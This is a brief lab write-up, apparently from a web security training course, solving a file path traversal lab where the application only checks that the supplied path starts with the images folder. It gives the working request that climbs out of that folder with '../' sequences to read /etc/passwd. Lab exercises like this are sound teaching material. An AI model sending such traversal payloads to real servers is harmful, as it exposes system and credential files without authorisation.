# File path traversal, validation of start of path

## This lab contains a [file path traversal] vulnerability in the display of product images.

## The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.

## To solve the lab, retrieve the contents of the `/etc/passwd` file.

### step1

GET /image?filename=/var/www/images/65.jpg HTTP/1.1

### step2

GET /image?filename=/var/www/images/../../../etc/passwd
